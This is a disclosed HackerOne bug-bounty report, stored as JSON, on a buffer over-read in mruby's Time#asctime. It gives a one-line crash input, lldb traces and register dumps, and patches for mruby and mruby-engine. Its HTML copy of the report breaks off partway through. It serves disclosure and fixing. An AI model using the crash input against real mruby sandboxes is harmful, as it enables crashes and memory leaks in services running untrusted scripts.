{"id":188326,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODgzMjY=","url":"https://hackerone.com/reports/188326","title":"Buffer overflow in mrb_time_asctime","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2016-12-05T04:03:11.187Z","submitted_at":"2016-12-05T04:03:11.187Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"haquaman","url":"/haquaman","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/646/07cbfc394d4d3432eb95cf9735f225ea803090bb_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-12-18T13:22:13.113Z","bug_reporter_agreed_on_going_public_at":"2016-12-17T20:11:31.935Z","team_member_agreed_on_going_public_at":"2016-12-18T13:22:13.080Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nThis one doesn't always crash every time, but with ASAN on it will.\n\nCrash file is:\n\n```\nTime.new-0XD00000000000000\u00260\n```\n\nBut you could always do `Time.at(sec,usec)` with special values, and basically anything that gets to_s called (`mrb_time_asctime` in C) (in this case, no method found exception does this).\n\nCrashes sometimes in mruby:\n\n```\n $ ./dev/bin/mruby crash.rb\nSegmentation fault: 11\n\n```\n\nThe times it doesn't crash, it could either return strings outside of memory with a buffer-overead. Some of the lldb runs shows this:\n\n```\n$ lldb ./dev/bin/mruby crash.rb\n(lldb) target create \"./dev/bin/mruby\"\nCurrent executable set to './dev/bin/mruby' (x86_64).\n(lldb) settings set -- target.run-args  \"crash.rb\"\n(lldb) r\nProcess 66222 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '\u0026' for Sun  00 16:03:04 1901 (NoMethodError)\nProcess 66222 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 66665 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '\u0026' for Sun Jan 00 16:03:04 1900 (NoMethodError)\nProcess 66665 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 66889 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '\u0026' for Sun Jan 00 16:03:04 1900 (NoMethodError)\nProcess 66889 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 67075 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '\u0026' for Sun Jan 01 16:03:04 1900 (NoMethodError)\nProcess 67075 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 67127 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '\u0026' for Sun _defined? 486 16:03:04 2259 (NoMethodError)\nProcess 67127 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 67341 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '\u0026' for Sun Jan 04 16:03:04 1900 (NoMethodError)\nProcess 67341 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 67904 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '\u0026' for Sun Jan 00 16:03:04 1900 (NoMethodError)\nProcess 67904 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 68098 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '\u0026' for Sun Jan 00 16:03:04 1900 (NoMethodError)\nProcess 68098 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 68320 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '\u0026' for Sun  01 16:03:04 1900 (NoMethodError)\nProcess 68320 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 68514 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '\u0026' for Sun Jan 00 16:03:04 1900 (NoMethodError)\nProcess 68514 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 68628 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '\u0026' for Sun ) 62 16:03:04 1983 (NoMethodError)\nProcess 68628 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 68870 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '\u0026' for Sun  00 16:03:04 1901 (NoMethodError)\nProcess 68870 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 68908 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '\u0026' for Sun  01 16:03:04 1901 (NoMethodError)\nProcess 68908 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 69130 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '\u0026' for Sun Jan 00 16:03:04 1900 (NoMethodError)\nProcess 69130 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 69324 launched: './dev/bin/mruby' (x86_64)\nProcess 69324 stopped\n* thread #1: tid = 0x88a312d, 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x14010ef30)\n    frame #0: 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18\nlibsystem_c.dylib`strlen:\n-\u003e  0x7fff95b0e152 \u003c+18\u003e: pcmpeqb (%rdi), %xmm0\n    0x7fff95b0e156 \u003c+22\u003e: pmovmskb %xmm0, %esi\n    0x7fff95b0e15a \u003c+26\u003e: andq   $0xf, %rcx\n    0x7fff95b0e15e \u003c+30\u003e: orq    $-0x1, %rax\n(lldb) bt\n* thread #1: tid = 0x88a312d, 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x14010ef30)\n  * frame #0: 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18\n    frame #1: 0x00007fff95b53a54 libsystem_c.dylib`__vfprintf + 5713\n    frame #2: 0x00007fff95b7c6c9 libsystem_c.dylib`__v2printf + 669\n    frame #3: 0x00007fff95b60915 libsystem_c.dylib`_vsnprintf + 596\n    frame #4: 0x00007fff95b609ca libsystem_c.dylib`vsnprintf + 80\n    frame #5: 0x00007fff95b91d08 libsystem_c.dylib`__snprintf_chk + 128\n    frame #6: 0x000000010004f15a mruby`mrb_time_asctime + 282\n    frame #7: 0x000000010003cf0b mruby`mrb_funcall_with_block + 1515\n    frame #8: 0x000000010003c901 mruby`mrb_funcall_argv + 113\n    frame #9: 0x000000010000c023 mruby`mrb_method_missing + 275\n    frame #10: 0x000000010000da7b mruby`mrb_bob_missing + 123\n    frame #11: 0x000000010003fc13 mruby`mrb_vm_exec + 6739\n    frame #12: 0x000000010003e1a7 mruby`mrb_vm_run + 135\n    frame #13: 0x0000000100046604 mruby`mrb_top_run + 100\n    frame #14: 0x0000000100071adf mruby`load_exec + 1183\n    frame #15: 0x0000000100071623 mruby`mrb_load_file_cxt + 67\n    frame #16: 0x00000001000017d8 mruby`main + 904\n    frame #17: 0x00007fff8a9db5ad libdyld.dylib`start + 1\n(lldb) register read\nGeneral Purpose Registers:\n       rax = 0x00000000ffffffff\n       rbx = 0x00000000ffffffff\n       rcx = 0x000000014010ef38\n       rdx = 0x000000014010ef38\n       rdi = 0x000000014010ef30\n       rsi = 0x00007fff95b52eb9  libsystem_c.dylib`__vfprintf + 2742\n       rbp = 0x00007fff5fbfbca0\n       rsp = 0x00007fff5fbfbca0\n        r8 = 0x0000000000000003\n        r9 = 0x000000010007f803  \"%s %02d %02d:%02d:%02d %s%d\"\n       r10 = 0x00007fffa10cd401\n       r11 = 0x00007ffe5fb713a0\n       r12 = 0x000000010007f805  \" %02d %02d:%02d:%02d %s%d\"\n       r13 = 0x0000000000000073\n       r14 = 0x0000000000000073\n       r15 = 0x0000000000000003\n       rip = 0x00007fff95b0e152  libsystem_c.dylib`strlen + 18\n    rflags = 0x0000000000010206\n        cs = 0x000000000000002b\n        fs = 0x0000000000000000\n        gs = 0x0000000000000000\n\n(lldb) q\nQuitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y\n\n```\n\nWith some symbols compiled in:\n\n```\n$ lldb ./mruby/bin/mruby crash.rb\n(lldb) target create \"./mruby/bin/mruby\"\nCurrent executable set to './mruby/bin/mruby' (x86_64).\n(lldb) settings set -- target.run-args  \"crash.rb\"\n(lldb) r\nProcess 1457 launched: './mruby/bin/mruby' (x86_64)\nProcess 1457 stopped\n* thread #1: tid = 0x88ab040, 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x101946780)\n    frame #0: 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18\nlibsystem_c.dylib`strlen:\n-\u003e  0x7fff95b0e152 \u003c+18\u003e: pcmpeqb (%rdi), %xmm0\n    0x7fff95b0e156 \u003c+22\u003e: pmovmskb %xmm0, %esi\n    0x7fff95b0e15a \u003c+26\u003e: andq   $0xf, %rcx\n    0x7fff95b0e15e \u003c+30\u003e: orq    $-0x1, %rax\n(lldb) up\nframe #1: 0x00007fff95b53a54 libsystem_c.dylib`__vfprintf + 5713\nlibsystem_c.dylib`__vfprintf:\n    0x7fff95b53a54 \u003c+5713\u003e: movq   %rax, -0x2f8(%rbp)\n    0x7fff95b53a5b \u003c+5720\u003e: movb   $0x0, -0x18f(%rbp)\n    0x7fff95b53a62 \u003c+5727\u003e: movl   $0x0, -0x304(%rbp)\n    0x7fff95b53a6c \u003c+5737\u003e: movl   %r14d, %r13d\n(lldb) up\nframe #2: 0x00007fff95b7c6c9 libsystem_c.dylib`__v2printf + 669\nlibsystem_c.dylib`__v2printf:\n    0x7fff95b7c6c9 \u003c+669\u003e: movl   %eax, %ebx\n    0x7fff95b7c6cb \u003c+671\u003e: jmp    0x7fff95b7c718            ; \u003c+748\u003e\n    0x7fff95b7c6cd \u003c+673\u003e: callq  0x7fff95b91fe4            ; symbol stub for: __error\n    0x7fff95b7c6d2 \u003c+678\u003e: movl   (%rax), %ebx\n(lldb) up\nframe #3: 0x00007fff95b60915 libsystem_c.dylib`_vsnprintf + 596\nlibsystem_c.dylib`_vsnprintf:\n    0x7fff95b60915 \u003c+596\u003e: testq  %rbx, %rbx\n    0x7fff95b60918 \u003c+599\u003e: je     0x7fff95b60924            ; \u003c+611\u003e\n    0x7fff95b6091a \u003c+601\u003e: movq   -0x1e0(%rbp), %rcx\n    0x7fff95b60921 \u003c+608\u003e: movb   $0x0, (%rcx)\n(lldb) up\nframe #4: 0x00007fff95b609ca libsystem_c.dylib`vsnprintf + 80\nlibsystem_c.dylib`vsnprintf:\n    0x7fff95b609ca \u003c+80\u003e: addq   $0x10, %rsp\n    0x7fff95b609ce \u003c+84\u003e: popq   %rbx\n    0x7fff95b609cf \u003c+85\u003e: popq   %r12\n    0x7fff95b609d1 \u003c+87\u003e: popq   %r14\n(lldb) up\nframe #5: 0x00007fff95b91d08 libsystem_c.dylib`__snprintf_chk + 128\nlibsystem_c.dylib`__snprintf_chk:\n    0x7fff95b91d08 \u003c+128\u003e: cmpq   -0x10(%rbp), %rbx\n    0x7fff95b91d0c \u003c+132\u003e: jne    0x7fff95b91d1d            ; \u003c+149\u003e\n    0x7fff95b91d0e \u003c+134\u003e: addq   $0xd8, %rsp\n    0x7fff95b91d15 \u003c+141\u003e: popq   %rbx\n(lldb)\nframe #6: 0x000000010004e8da mruby`mrb_time_asctime(mrb=0x00000001002029f0, self=mrb_value @ 0x00007fff5fbfc530) + 282 at time.c:506\n   503\n   504    tm = DATA_GET_PTR(mrb, self, \u0026mrb_time_type, struct mrb_time);\n   505    d = \u0026tm-\u003edatetime;\n-\u003e 506    len = snprintf(buf, sizeof(buf), \"%s %s %02d %02d:%02d:%02d %s%d\",\n   507      wday_names[d-\u003etm_wday], mon_names[d-\u003etm_mon], d-\u003etm_mday,\n   508      d-\u003etm_hour, d-\u003etm_min, d-\u003etm_sec,\n   509      tm-\u003etimezone == MRB_TIMEZONE_UTC ? \"UTC \" : \"\",\n(lldb) p *tm\n(mrb_time) $0 = {\n  sec = -936748721012153088\n  usec = 105092\n  timezone = MRB_TIMEZONE_LOCAL\n  datetime = {\n    tm_sec = 12\n    tm_min = 5\n    tm_hour = 16\n    tm_mday = 1\n    tm_mon = 6484120\n    tm_year = 1\n    tm_wday = 0\n    tm_yday = 1\n    tm_isdst = 0\n    tm_gmtoff = 1701667182\n    tm_zone = 0x000a000000000000 \u003cno value available\u003e\n  }\n}\n(lldb) p *d\n(tm) $1 = {\n  tm_sec = 12\n  tm_min = 5\n  tm_hour = 16\n  tm_mday = 1\n  tm_mon = 6484120\n  tm_year = 1\n  tm_wday = 0\n  tm_yday = 1\n  tm_isdst = 0\n  tm_gmtoff = 1701667182\n  tm_zone = 0x000a000000000000 \u003cno value available\u003e\n}\n(lldb) q\nQuitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y\n\n```\n\nPatch to fix would be this:\n\n```\ndiff --git a/mrbgems/mruby-time/src/time.c b/mrbgems/mruby-time/src/time.c\nindex dfd4450..5dc5b34 100644\n--- a/mrbgems/mruby-time/src/time.c\n+++ b/mrbgems/mruby-time/src/time.c\n@@ -238,7 +238,9 @@ time_alloc(mrb_state *mrb, double sec, double usec, enum mrb_timezone timezone)\n     tm-\u003eusec -= 1000000;\n   }\n   tm-\u003etimezone = timezone;\n-  mrb_time_update_datetime(tm);\n+  if (!mrb_time_update_datetime(tm)) {\n+    mrb_raisef(mrb, E_ARGUMENT_ERROR, \"%S out of Time range\", mrb_float_value(mrb, sec));\n+  }\n \n   return tm;\n }\n```\n\nWhich now returns:\n\n```\n$ ./mruby/bin/mruby crash.rb\n        [0] crash.rb:1\ncrash.rb:1: -9.3674872101215e+17 out of Time range (ArgumentError)\n\n```\n\n\nAlso affected `mruby-engine`:\n\n```\n$ ./bin/sandbox crash.rb\n./bin/sandbox:20: [BUG] Segmentation fault at 0x0000014531cca0\nruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]\n\n-- Crash Report log information --------------------------------------------\n   See Crash Report log file under the one of following:\n     * ~/Library/Logs/CrashReporter\n     * /Library/Logs/CrashReporter\n     * ~/Library/Logs/DiagnosticReports\n     * /Library/Logs/DiagnosticReports\n   for more details.\nDon't forget to include the above Crash Report log file in bug reports.\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0011 e:000010 CFUNC  :sandbox_eval\nc:0002 p:0214 s:0006 E:000c80 EVAL   ./bin/sandbox:20 [FINISH]\nc:0001 p:0000 s:0002 E:001810 (none) [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\n./bin/sandbox:20:in `\u003cmain\u003e'\n./bin/sandbox:20:in `sandbox_eval'\n\n-- Machine register context ------------------------------------------------\n rax: 0x00000000ffffffff rbx: 0x00000000ffffffff rcx: 0x000000014531cca0\n rdx: 0x000000014531cca0 rdi: 0x000000014531cca0 rsi: 0x00007fff95b52eb9\n rbp: 0x00007fff528d0400 rsp: 0x00007fff528d0400  r8: 0x0000000000000003\n  r9: 0x000000010dd2a24a r10: 0x00007fffa10cd401 r11: 0x00007ffe44bac7b4\n r12: 0x000000010dd2a24c r13: 0x0000000000000073 r14: 0x0000000000000073\n r15: 0x0000000000000003 rip: 0x00007fff95b0e152 rfl: 0x0000000000010206\n\n-- C level backtrace information -------------------------------------------\n0   ruby                                0x000000010d4cb5d4 rb_vm_bugreport + 388\n1   ruby                                0x000000010d36d023 rb_bug_context + 483\n2   ruby                                0x000000010d440653 sigsegv + 83\n3   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26\n4   libsystem_c.dylib                   0x00007fff95b0e152 strlen + 18\n5   ???                                 0x00007fff528d07f0 0x0 + 140734578362352\n\n-- Other runtime information -----------------------------------------------\n\n* Loaded script: ./bin/sandbox\n\n* Loaded features:\n\n    0 enumerator.so\n    1 thread.rb\n    2 rational.so\n    3 complex.so\n\u003csnip various gems\u003e\n  185 /Users/\u003csnip\u003e/mruby-engine/lib/mruby_engine/mruby_engine.bundle\n  186 /Users/\u003csnip\u003e/mruby-engine/lib/mruby_engine.rb\n\n[NOTE]\nYou may have encountered a bug in the Ruby interpreter or extension libraries.\nBug reports are welcome.\nFor details: http://www.ruby-lang.org/bugreport.html\n\nAbort trap: 6\n\n```\n\nPatch to fix `mruby-engine`:\n\n```\ndiff --git a/ext/mruby_engine/mruby-time/src/time.c b/ext/mruby_engine/mruby-time/src/time.c\nindex 8884a5d..2b5d770 100644\n--- a/ext/mruby_engine/mruby-time/src/time.c\n+++ b/ext/mruby_engine/mruby-time/src/time.c\n@@ -236,7 +236,9 @@ time_alloc(mrb_state *mrb, double sec, double usec, enum mrb_timezone timezone)\n     tm-\u003eusec -= 1000000;\n   }\n   tm-\u003etimezone = timezone;\n-  mrb_time_update_datetime(tm);\n+  if (!mrb_time_update_datetime(tm)) {\n+    mrb_raisef(mrb, E_ARGUMENT_ERROR, \"%S out of Time range\", mrb_float_value(mrb, sec));\n+  }\n \n   return tm;\n }\n```\n\nNow returns:\n\n```\n$ ./bin/sandbox crash.rb\n./bin/sandbox:20:in `sandbox_eval': -9.3674872249306e+17 out of Time range (MRubyEngine::EngineRuntimeError)\n        from ./bin/sandbox:20:in `\u003cmain\u003e'\n\n```\n\nCheers,\n\nHugh","vulnerability_information_html":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eThis one doesn\u0026#39;t always crash every time, but with ASAN on it will.\u003c/p\u003e\n\n\u003cp\u003eCrash file is:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eTime.new-0XD00000000000000\u0026amp;0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut you could always do \u003ccode\u003eTime.at(sec,usec)\u003c/code\u003e with special values, and basically anything that gets to_s called (\u003ccode\u003emrb_time_asctime\u003c/code\u003e in C) (in this case, no method found exception does this).\u003c/p\u003e\n\n\u003cp\u003eCrashes sometimes in mruby:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e $ ./dev/bin/mruby crash.rb\nSegmentation fault: 11\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe times it doesn\u0026#39;t crash, it could either return strings outside of memory with a buffer-overead. Some of the lldb runs shows this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ lldb ./dev/bin/mruby crash.rb\n(lldb) target create \u0026quot;./dev/bin/mruby\u0026quot;\nCurrent executable set to \u0026#39;./dev/bin/mruby\u0026#39; (x86_64).\n(lldb) settings set -- target.run-args  \u0026quot;crash.rb\u0026quot;\n(lldb) r\nProcess 66222 launched: \u0026#39;./dev/bin/mruby\u0026#39; (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method \u0026#39;\u0026amp;\u0026#39; for Sun  00 16:03:04 1901 (NoMethodError)\nProcess 66222 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 66665 launched: \u0026#39;./dev/bin/mruby\u0026#39; (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method \u0026#39;\u0026amp;\u0026#39; for Sun Jan 00 16:03:04 1900 (NoMethodError)\nProcess 66665 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 66889 launched: \u0026#39;./dev/bin/mruby\u0026#39; (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method \u0026#39;\u0026amp;\u0026#39; for Sun Jan 00 16:03:04 1900 (NoMethodError)\nProcess 66889 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 67075 launched: \u0026#39;./dev/bin/mruby\u0026#39; (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method \u0026#39;\u0026amp;\u0026#39; for Sun Jan 01 16:03:04 1900 (NoMethodError)\nProcess 67075 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 67127 launched: \u0026#39;./dev/bin/mruby\u0026#39; (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method \u0026#39;\u0026amp;\u0026#39; for Sun _defined? 486 16:03:04 2259 (NoMethodError)\nProcess 67127 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 67341 launched: \u0026#39;./dev/bin/mruby\u0026#39; (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method \u0026#39;\u0026amp;\u0026#39; for Sun Jan 04 16:03:04 1900 (NoMethodError)\nProcess 67341 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 67904 launched: \u0026#39;./dev/bin/mruby\u0026#39; (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method \u0026#39;\u0026amp;\u0026#39; for Sun Jan 00 16:03:04 1900 (NoMethodError)\nProcess 67904 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 68098 launched: \u0026#39;./dev/bin/mruby\u0026#39; (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method \u0026#39;\u0026amp;\u0026#39; for Sun Jan 00 16:03:04 1900 (NoMethodError)\nProcess 68098 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 68320 launched: \u0026#39;./dev/bin/mruby\u0026#39; (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method \u0026#39;\u0026amp;\u0026#39; for Sun  01 16:03:04 1900 (NoMethodError)\nProcess 68320 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 68514 launched: \u0026#39;./dev/bin/mruby\u0026#39; (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method \u0026#39;\u0026amp;\u0026#39; for Sun Jan 00 16:03:04 1900 (NoMethodError)\nProcess 68514 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 68628 launched: \u0026#39;./dev/bin/mruby\u0026#39; (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method \u0026#39;\u0026amp;\u0026#39; for Sun ) 62 16:03:04 1983 (NoMethodError)\nProcess 68628 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 68870 launched: \u0026#39;./dev/bin/mruby\u0026#39; (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method \u0026#39;\u0026amp;\u0026#39; for Sun  00 16:03:04 1901 (NoMethodError)\nProcess 68870 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 68908 launched: \u0026#39;./dev/bin/mruby\u0026#39; (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method \u0026#39;\u0026amp;\u0026#39; for Sun  01 16:03:04 1901 (NoMethodError)\nProcess 68908 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 69130 launched: \u0026#39;./dev/bin/mruby\u0026#39; (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method \u0026#39;\u0026amp;\u0026#39; for Sun Jan 00 16:03:04 1900 (NoMethodError)\nProcess 69130 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 69324 launched: \u0026#39;./dev/bin/mruby\u0026#39; (x86_64)\nProcess 69324 stopped\n* thread #1: tid = 0x88a312d, 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18, queue = \u0026#39;com.apple.main-thread\u0026#39;, stop reason = EXC_BAD_ACCESS (code=1, address=0x14010ef30)\n    frame #0: 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18\nlibsystem_c.dylib`strlen:\n-\u0026gt;  0x7fff95b0e152 \u0026lt;+18\u0026gt;: pcmpeqb (%rdi), %xmm0\n    0x7fff95b0e156 \u0026lt;+22\u0026gt;: pmovmskb %xmm0, %esi\n    0x7fff95b0e15a \u0026lt;+26\u0026gt;: andq   $0xf, %rcx\n    0x7fff95b0e15e \u0026lt;+30\u0026gt;: orq    $-0x1, %rax\n(lldb) bt\n* thread #1: tid = 0x88a312d, 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18, queue = \u0026#39;com.apple.main-thread\u0026#39;, stop reason = EXC_BAD_ACCESS (code=1, address=0x14010ef30)\n  * frame #0: 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18\n    frame #1: 0x00007fff95b53a54 libsystem_c.dylib`__vfprintf + 5713\n    frame #2: 0x00007fff95b7c6c9 libsystem_c.dylib`__v2printf + 669\n    frame #3: 0x00007fff95b60915 libsystem_c.dylib`_vsnprintf + 596\n    frame #4: 0x00007fff95b609ca libsystem_c.dylib`vsnprintf + 80\n    frame #5: 0x00007fff95b91d08 libsystem_c.dylib`__snprintf_chk + 128\n    frame #6: 0x000000010004f15a mruby`mrb_time_asctime + 282\n    frame #7: 0x000000010003cf0b mruby`mrb_funcall_with_block + 1515\n    frame #8: 0x000000010003c901 mruby`mrb_funcall_argv + 113\n    frame #9: 0x000000010000c023 mruby`mrb_method_missing + 275\n    frame #10: 0x000000010000da7b mruby`mrb_bob_missing + 123\n    frame #11: 0x000000010003fc13 mruby`mrb_vm_exec + 6739\n    frame #12: 0x000000010003e1a7 mruby`mrb_vm_run + 135\n    frame #13: 0x0000000100046604 mruby`mrb_top_run + 100\n    frame #14: 0x0000000100071adf mruby`load_exec + 1183\n    frame #15: 0x0000000100071623 mruby`mrb_load_file_cxt + 67\n    frame #16: 0x00000001000017d8 mruby`main + 904\n    frame #17: 0x00007fff8a9db5ad libdyld.dylib`start + 1\n(lldb) register read\nGeneral Purpose Registers:\n       rax = 0x00000000ffffffff\n       rbx = 0x00000000ffffffff\n       rcx = 0x000000014010ef38\n       rdx = 0x000000014010ef38\n       rdi = 0x000000014010ef30\n       rsi = 0x00007fff95b52eb9  libsystem_c.dylib`__vfprintf + 2742\n       rbp = 0x00007fff5fbfbca0\n       rsp = 0x00007fff5fbfbca0\n        r8 = 0x0000000000000003\n        r9 = 0x000000010007f803  \u0026quot;%s %02d %02d:%02d:%02d %s%d\u0026quot;\n       r10 = 0x00007fffa10cd401\n       r11 = 0x00007ffe5fb713a0\n       r12 = 0x000000010007f805  \u0026quot; %02d %02d:%02d:%02d %s%d\u0026quot;\n       r13 = 0x0000000000000073\n       r14 = 0x0000000000000073\n       r15 = 0x0000000000000003\n       rip = 0x00007fff95b0e152  libsystem_c.dylib`strlen + 18\n    rflags = 0x0000000000010206\n        cs = 0x000000000000002b\n        fs = 0x0000000000000000\n        gs = 0x0000000000000000\n\n(lldb) q\nQuitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWith some symbols compiled in:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ lldb ./mruby/bin/mruby crash.rb\n(lldb) target create \u0026quot;./mruby/bin/mruby\u0026quot;\nCurrent executable set to \u0026#39;./mruby/bin/mruby\u0026#39; (x86_64).\n(lldb) settings set -- target.run-args  \u0026quot;crash.rb\u0026quot;\n(lldb) r\nProcess 1457 launched: \u0026#39;./mruby/bin/mruby\u0026#39; (x86_64)\nProcess 1457 stopped\n* thread #1: tid = 0x88ab040, 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18, queue = \u0026#39;com.apple.main-thread\u0026#39;, stop reason = EXC_BAD_ACCESS (code=1, address=0x101946780)\n    frame #0: 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18\nlibsystem_c.dylib`strlen:\n-\u0026gt;  0x7fff95b0e152 \u0026lt;+18\u0026gt;: pcmpeqb (%rdi), %xmm0\n    0x7fff95b0e156 \u0026lt;+22\u0026gt;: pmovmskb %xmm0, %esi\n    0x7fff95b0e15a \u0026lt;+26\u0026gt;: andq   $0xf, %rcx\n    0x7fff95b0e15e \u0026lt;+30\u0026gt;: orq    $-0x1, %rax\n(lldb) up\nframe #1: 0x00007fff95b53a54 libsystem_c.dylib`__vfprintf + 5713\nlibsystem_c.dylib`__vfprintf:\n    0x7fff95b53a54 \u0026lt;+5713\u0026gt;: movq   %rax, -0x2f8(%rbp)\n    0x7fff95b53a5b \u0026lt;+5720\u0026gt;: movb   $0x0, -0x18f(%rbp)\n    0x7fff95b53a62 \u0026lt;+5727\u0026gt;: movl   $0x0, -0x304(%rbp)\n    